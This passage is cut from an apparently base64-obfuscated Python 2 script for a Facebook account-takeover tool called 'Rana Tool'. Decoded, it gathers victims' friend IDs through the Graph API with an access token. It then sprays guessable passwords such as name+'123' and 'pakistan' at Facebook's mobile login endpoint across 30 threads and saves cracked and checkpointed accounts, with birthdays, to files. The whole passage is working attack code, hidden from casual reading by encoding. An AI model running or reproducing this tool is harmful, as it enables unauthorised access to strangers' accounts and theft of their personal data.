tleUVycm9yOg0KCQkJcHJpbnQgKCJbU29ycnkgaWQgbm90IHB1YmxpY10iKSANCgkJCWV4aXQoKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIGkgaW4gelsiZGF0YSJdOg0KCQkJdWlkID0gaVsnaWQnXQ0KCQkJbmEgPSBpWyduYW1lJ10NCgkJCW5tID0gbmEucnNwbGl0KCIgIilbMF0NCgkJCWlkLmFwcGVuZCh1aWQrJ3wnK25tKQ0KCWVsaWYgYXNrID09ICI1IiBvciBhc2sgPT0gIjA1IjoNCgkJcHJpbnQiWzFdLiBDaGVjayByZXN1bHQgb2siDQoJCXByaW50IlsyXS4gQ2hlY2sgcmVzdWx0IGNwIg0KCQlyZXNzID0gcmF3X2lucHV0KCJbc2VsZWN0XSA6ICIpDQoJCWlmIHJlc3MgPT0iIjoNCgkJCW1lbnUoKQ0KCQllbGlmIHJlc3MgPT0gIjEiIG9yIHJlc3MgPT0gIjAxIjoNCgkJCXByaW50ICgiXG4gWytdIENoZWNrIFwwMzNbMDs5MW9rXDAzM1swOzk3bSBkYXRlIDogXDAzM1swOzkybSVzLSVzLSVzXDAzM1swOzk3bSIgJSAoaGEsIG9wLCB0YSkpIA0KCQkJb3Muc3lzdGVtKCJjYXQgb3V0L09LLSVzLSVzLSVzLnR4dCIgJSAoaGEsIG9wLCB0YSkpDQoJCQlleGl0KCkNCgkJZWxpZiByZXNzID09ICIyIiBvciByZXNzID09ICIwMiI6DQoJCQlwcmludCAoIiBbK10gQ2hlY2sgXDAzM1swOzkzbWNwXDAzM1swOzk3bSBkYXRlIDogXDAzM1swOzkybSVzLSVzLSVzXDAzM1swOzk3bSIgJSAoaGEsIG9wLCB0YSkpIA0KCQkJb3Muc3lzdGVtKCJjYXQgb3V0L0NQLSVzLSVzLSVzLnR4dCIgJSAoaGEsIG9wLCB0YSkpDQoJCQlleGl0KCkNCgkJZWxzZToNCgkJCWV4aXQoIltjaG9vc2UgdGhlIHJpZ2h0IG9uZSBkZWFyXSIpIA0KCWVsaWYgYXNrID09ICIwIiBvciBhc2sgPT0gIjAwIjoNCgkJb3Muc3lzdGVtKCJybSAtZiBsb2dpbi50eHQiKSANCgkJcHJpbnQgKCJbIHN1Y2Nlc3NmdWxseSBkZWxldGVkIHRva2VuXSIpIA0KCQlleGl0KCkNCgllbHNlOg0KCQlwcmludCAoIltjaG9vc2UgdGhlIHJpZ2h0IG9uZSBkZWFyXSIpIA0KCQlleGl0KCkNCgkNCglwcmludCJcMDMzWzA7OTFtW3RvdGFsIGlkXSAgOiAiICtzdHIobGVuKGlkKSkNCglhc2sgPSByYXdfaW5wdXQoIlxuW3dhbnQgdG8gdXNlIHBhc3N3b3JkIENob2ljZSAvbWFudWFsIChjL20pIDogIikNCglpZiBhc2sgPT0gImMiIG9yIGFzayA9PSAieSI6DQoJCW1hbnVhbCgpDQoJcHJpbnQiX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iDQoJcHJpbnQiW0Nsb25pbmcgU3RhcnQgTm93IHBsZWFzZSBXYWl0Li4gXSINCglwcmludCJbVGhpcyBJcyBTdXBlciBGYXN0IENvbW1hbmQgXSINCglwcmludCJbYWlycGxhbmUgbW9kZSAxMCBzZWNvbmRzIGlmIHlvdSBzZWUgbm8gcmVzdWx0IF0iDQoJcHJpbnQiX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iDQoNCglkZWYgbWFpbihhcmcpOg0KCQlnbG9iYWwgb2ssY3AsdWEsIGxvb3ANCgkJcHJpbnQgJ1xyWyAlcy8lcyBPSy06JXMgLSBDUC06JXNdICcgJSAobG9vcCwgbGVuKGlkKSwgbGVuKG9rKSwgbGVuKGNwKSksDQoJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQl1c2VyID0gYXJnDQoJCXVpZCxuYW1lPXVzZXIuc3BsaXQoInwiKSANCgkJdHJ5Og0KCQkJb3MubWtkaXIoJ291dCcpDQoJCWV4Y2VwdCBPU0Vycm9yOg0KCQkJcGFzcw0KCQl0cnk6DQoJCQlmb3IgcHcgaW4gW25hbWUubG93ZXIoKSsnMTIzJyxuYW1lLmxvd2VyKCkrJzEyMzQnLG5hbWUubG93ZXIoKSsnMTIzNDUnLG5hbWUubG93ZXIoKSsnNzg2JywnMDAwNzg2JywnNzg2Nzg2JywncGFraXN0YW4nXToNCgkJCQl1YSA9cmFuZG9tLmNob2ljZShbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUEzMTBGIEJ1aWxkL05SRDkwTSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My45MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNDIuNy4yMjQ2LjExNDk5NiJdKQ0KCQkJCWhlYWRlcnNfID0geyd4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoJzogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwMDAwLjAsIDMwMDAwMDAwLjApKSwgJ3gtZmItc2ltLWhuaSc6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgDQoJCQkJJ3gtZmItbmV0LWhuaSc6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgDQoJCQkJJ3gtZmItY29ubmVjdGlvbi1xdWFsaXR5JzogJ0VYQ0VMTEVOVCcsIA0KCQkJCSd4LWZiLWNvbm5lY3Rpb24tdHlwZSc6ICdjZWxsLkNUUmFkaW9BY2Nlc3NUZWNobm9sb2d5SFNEUEEnLCANCgkJCQkndXNlci1hZ2VudCc6IHVhLCANCgkJCQknY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsIA0KCQkJCSd4LWZiLWh0dHAtZW5naW5lJzogJ0xpZ2VyJ30NCgkJCQlzZXM9cmVxdWVzdHMuU2Vzc2lvbigpDQoJCQkJYXBpPSJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbiINCgkJCQlwYXJhbT17ImFjY2Vzc190b2tlbiI6ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiIsImZvcm1hdCI6ICJKU09OIiwic2RrX3ZlcnNpb24iOiAiMiIsImVtYWlsIjp1aWQsImxvY2FsZSI6ICJlbl9VUyIsInBhc3N3b3JkIjpwdywic2RrIjogImlvcyIsImdlbmVyYXRlX3Nlc3Npb25fY29va2llcyI6ICIxIiwic2lnIjogIjNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2In0NCgkJCQlzZW5kPXNlcy5nZXQoYXBpLHBhcmFtcz1wYXJhbSwgaGVhZGVycz1oZWFkZXJzXykNCgkJCQlpZiAiYWNjZXNzX3Rva2VuIiBpbiBzZW5kLnRleHQgYW5kICJFQUFBIiBpbiBzZW5kLnRleHQ6DQoJCQkJCXByaW50ICdcclwwMzNbMDs5Mm1bUmFuYS5cMDMzWzA7OTJtb2tdXDAzM1swOzkybVwwMzNbMDs5Mm0gJyArdWlkKyAnIOKAoiAnICsgcHcrICcgICAgICAgICcNCgkJCQkJb2suYXBwZW5kKHVpZCsnIOKAoiAnK3B3KQ0KCQkJCQlzYXZlID0gb3Blbignb3V0L09LLSVzLSVzLSVzLnR4dCcgJSAoaGEsIG9wLCB0YSksJ2EnKSANCgkJCQkJc2F2ZS53cml0ZSgnICBbT0tdICcrc3RyKHVpZCkrJyDigKIgJytzdHIocHcpKydcbicpDQoJCQkJCXNhdmUuY2xvc2UoKQ0KCQkJCQlicmVhaw0KCQkJCQljb250aW51ZQ0KCQkJCQljb250aW51ZQ0KCQkJCWVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHNlbmQuanNvbigpWyJlcnJvcl9tc2ciXToNCgkJCQkJdHJ5Og0KCQkJCQkJdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnKS5yZWFkKCkNCgkJCQkJCXVybCA9ICgiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyIrdWlkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZW4pDQoJCQkJCQlkYXRhID0gcy5nZXQodXJsKS5qc29uKCkNCgkJCQkJCW5hbWEgPSBkYXRhWyduYW1lJ10NCgkJCQkJCXR0bCA9IGRhdGFbJ2JpcnRoZGF5J10ucmVwbGFjZSgiLyIsIi0iKQ0KCQkJCQkJcHJpbnQoJ1xyXDAzM1sxOzkzbVtDUF0gJyArdWlkKyAn4oCiJyArIHB3ICsgJ+KAoicgKyB0dGwpDQoJCQkJCQljcC5hcHBlbmQodWlkKyfigKInK3B3KyfigKInK3R0bCkNCgkJCQkJCXNhdmUgPSBvcGVuKCdvdXQvQ1AtJXMtJXMtJXMudHh0JyAlIChoYSwgb3AsIHRhKSwnYScpDQoJCQkJCQlzYXZlLndyaXRlKCcgIFtDUF0gJytzdHIodWlkKSsn4oCiJytzdHIocHcpKyfigKInK3R0bCsnXG4nKQ0KCQkJCQkJc2F2ZS5jbG9zZSgpDQoJCQkJCQlicmVhaw0KCQkJCQlleGNlcHQoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCQkJdHRsID0gJyAnDQoJCQkJCWV4Y2VwdDpwYXNzDQoJCQkJCXByaW50ICdcclwwMzNbMDs5MW1bUmFuYS5cMDMzWzA7OTFtY3BdXDAzM1swOzkxbVwwMzNbMDs5MW0gJyArdWlkKyAnIOKAoiAnICsgcHcgKyAnICAgICAgICAnDQoJCQkJCWNwLmFwcGVuZCh1aWQrJyDigKIgJytwdykNCgkJCQkJc2F2ZSA9IG9wZW4oJ291dC9DUC0lcy0lcy0lcy50eHQnICUgKGhhLCBvcCwgdGEpLCdhJykgDQoJCQkJCXNhdmUud3JpdGUoJyAgW0NQXSAnK3N0cih1aWQpKycg4oCiICcrc3RyKHB3KSsnXG4nKQ0KCQkJCQlzYXZlLmNsb3NlKCkNCgkJCQkJYnJlYWsNCgkJCQkJY29udGludWUNCgkJCQ0KCQkJbG9vcCArPSAxDQoJCWV4Y2VwdDoNCgkJCXBhc3MNCglwID0gVGhyZWFkUG9vbCgzMCkNCglwLm1hcChtYWluLCBpZCkNCglwcmludCIgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSINCglwcmludCgiXG4gW2Nsb25pbmcgY29tcGxldGVdIEZvciBFeGl0IHR5cGUgW3B5dGhvbjIgRmFzdHRvb2wucHldLi4uIikNCglwcmludCgiXG4gW1RoYW5rcyBGb3IgVXNpbmcgUmFuYSBUb29sXSIpDQoJcHJpbnQoIlxuIFtSZW1lbWJlciBtZSBpbiB5b3VyIHByYXldIikNCglleGl0KCkNCg0KZGVmIG1hbnVhbCgpOg0KCXByaW50KCJcMDMzWzA7OTdtRW50ZXIgcGFzc3dvcmQgZXhhbXBsZSA6IHBha2lzdGFuLDAwMDc4Niw3ODY3ODYiKQ0KCXB3ID0gcmF3X2lucHV0KCJcMDMzWzA7OTdtICogIHNldCBwYXNzd29yZCA6ICIpLnNwbGl0KCIsIikNCglwcmludA0KCWlmIGxlbihwdykgPT0wOg0KCQlleGl0KCJbY29ycmVjdCBjb250ZW50LCBjYW4ndCBiZSBlbXB0eV0iKQ0KCXByaW50KCJcMDMzWzA7OTNtWyBudW1iZXIgb2YgcGFzc3dvcmRzIGNyZWF0ZWQgOiBcMDMzWzA7OTNtXSIgK3N0cihsZW4ocHcpKSkNCgkNCglkZWYgbWFpbihhcmcpOg0KCQlnbG9iYWwgb2ssY3AsdWEsbG9vcA0KCQlwcmludCAnXHIgXDAzM1swOzkxbVsgJXMvJXMgT0stOiVzIC0gQ1AtOiVzIF0nICUgKGxvb3AsIGxlbihpZCksIGxlbihvayksIGxlbihjcCkpLA0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJdXNlciA9IGFyZw0KCQl1aWQsbmFtZT11c2VyLnNwbGl0KCJ8IikgDQoJCXRyeToNCgkJCW9zLm1rZGlyKCdvdXQnKQ0KCQlleGNlcHQgT1NFcnJvcjoNCgkJCXBhc3MNCgkJdHJ5Og0KCQkJZm9yIGFzdSBpbiBwdzoNCgkJCQl1YSA9ICdEYWx2aWsvMi4xLjAgKExpbnV4OyBVOyBBbmRyb2lkIDk7IElORS1MWDFyIEJ1aWxkL0hVQVdFSUlORS1MWDFyKSBbRkJBTi9PcmNhLUFuZHJvaWQ7RkJBVi8yMTIuMS4wLjEzLjEwOTtGQlBOL2NvbS5mYWNlYm9vay5vcmNhO0ZCTEMvZW5fVVM7RkJCVi8xNTE1MzQyODY7RkJDUi87RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJEVi9JTkUtTFgxcjtGQlNWLzk7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMjh9O0ZCX0ZXLzE7XScNCgkJCQloZWFkZXJzXyA9IHsneC1mYi1jb25uZWN0aW9uLWJhbmR3aWR0aCc6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMDAwMC4wLCAzMDAwMDAwMC4wKSksICd4LWZiLXNpbS1obmknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksIA0KCQkJCSd4LWZiLW5ldC1obmknOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksIA0KCQkJCSd4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSc6ICdFWENFTExFTlQnLCANCgkJCQkneC1mYi1jb25uZWN0aW9uLXR5cGUnOiAnY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBJywgDQoJCQkJJ3VzZXItYWdlbnQnOiB1YSwgDQoJCQkJJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLCANCgkJCQkneC1mYi1odHRwLWVuZ2luZSc6ICdMaWdlcid9DQoJCQkJc2VzPXJlcXVlc3RzLlNlc3Npb24oKQ0KCQkJCWFwaT0iaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4iDQoJCQkJcGFyYW09eyJhY2Nlc3NfdG9rZW4iOiAiMzUwNjg1NTMxNzI4JTdDNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzIiLCJmb3JtYXQiOiAiSlNPTiIsInNka192ZXJzaW9uIjogIjIiLCJlbWFpbCI6dWlkLCJsb2NhbGUiOiAiZW5fVVMiLCJwYXNzd29yZCI6YXN1LCJzZGsiOiAiaW9zIiwiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjogIjEiLCJzaWciOiAiM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYifQ0KCQkJCXNlbmQ9c2VzLmdldChhcGkscGFyYW1zPXBhcmFtLCBoZWFkZXJzPWhlYWRlcnNfKQ0KCQkJCWlmICJhY2Nlc3NfdG9rZW4iIGluIHNlbmQudGV4dCBhbmQgIkVBQUEiIGluIHNlbmQudGV4dDoNCgkJCQkJcHJpbnQgJ1xyXDAzM1swOzkybVtSYW5hLlwwMzNbMDs5Mm1va11cMDMzWzA7OTJtXDAzM1swOzkybSAnICt1aWQrICcg4oCiICcgKyBhc3UgKyAnICAgICAgICAnDQoJCQkJCW9rLmFwcGVuZCh1aWQrJyDigKIgJythc3UpDQoJCQkJCXNhdmUgPSBvcGVuKCdvdXQvT0stJXMtJXMtJXMudHh0JyAlIChoYSwgb3AsIHRhKSwnYScpIA0KCQkJCQlzYXZlLndyaXRlKCcgIFtPS10gJytzdHIodWlkKSsnIOKAoiAnK3N0cihhc3UpKydcbicpDQoJCQkJCXNhdmUuY2xvc2UoKQ0KCQkJCQlicmVhaw0KCQkJCQljb250aW51ZQ0KCQkJCQljb250aW51ZQ0KCQkJCWVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHNlbmQuanNvbigpWyJlcnJvcl9tc2ciXToNCgkJCQkJdHJ5Og0KCQkJCQkJdG9rZW4gPSBvcGVuKCdsb2dpbi50eHQnKS5yZWFkKCkNCgkJCQkJCXVybCA9ICgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1aWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tlbikNCgkJCQkJCWRhdGEgPSBzLmdldCh1cmwpLmpzb24oKQ0KCQkJCQkJbmFtYSA9IGRhdGFbJ25hbWUnXQ0KCQkJCQkJdHRsID0gZGF0YVsnYmlydGhkYXknXS5yZXBsYWNlKCIvIiwiLSIpDQoJCQkJCQlwcmludCgnXHJcMDMzWzE7OTNtW0NQXSAnICt1aWQrICfigKInICsgYXN1ICsgJ+KAoicgKyB0dGwpDQoJCQkJCQljcC5hcHBlbmQodWlkKyfigKInK2FzdSsn4oCiJyt0dGwpDQoJCQkJCQlzYXZlID0gb3Blbignb3V0L0NQLSVzLSVzLSVzLnR4dCcgJSAoaGEsIG9wLCB0YSksJ2EnKQ0KCQkJCQkJc2F2ZS53cml0ZSgnICBbQ1BdICcrc3RyKHVpZCkrJ+KAoicrc3RyKGFzdSkrJ+KAoicrdHRsKydcbicpDQoJCQkJCQlzYXZlLmNsb3NlKCkNCgkJCQkJCWJyZWFrDQoJCQkJCWV4Y2VwdChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCQl0dGwgPSAnICcNCgkJCQkJZXhjZXB0OnBhc3MNCgkJCQkJcHJpbnQgJ1xyXDAzM1swOzkxbVtSYW5hLlwwMzNbMDs5MW1jcF1cMDMzWzA7OTFtXDAzM1swOzkxbSAnICt1aWQrICcg4oCiICcgKyBhc3UgKyAnICAgICAgICAnDQoJCQkJCWNwLmFwcGVuZCh1aWQrJyDigKIgJythc3UpDQoJCQkJCXNhdmUgPSBvcGVuKCdvdXQvQ1AtJXMtJXMtJXMudHh0JyAlIChoYSwgb3AsIHRhKSwnYScpIA0KCQkJCQlzYXZlLndyaXRlKCcgIFtDUF0gJytzdHIodWlkKSsnIOKAoiAnK3N0cihhc3UpKydcbicpDQoJCQkJCXNhdmUuY2xvc2UoKQ0KCQkJCQlicmVhaw0KCQkJCQljb250aW51ZQ0KCQkJDQoJCQlsb29wICs9IDENCgkJZXhjZXB0Og0KCQkJcGFzcw0KCXAgPSBUaHJlYWRQb29sKDMwKQ0KCXAubWFwKG1haW4sIGlkKQ0KCXByaW50Il9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyINCglwcmludCgiXG4gW0Nsb25pbmcgQ29tcGxldGVdIEZvciBFeGl0IHR5cGUgW3B5dGhvbjIgRmFzdHRvb2wucHldLi4uIikNCglwcmludCJcbiBUaGFua3MgRm9yIFVzaW5nIFJhbmEgVG9vbCBSZW1iZXIgbWUgaW4gWW91ciBwcmF5Ig0KCWV4aXQoKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KCWdlbigp"))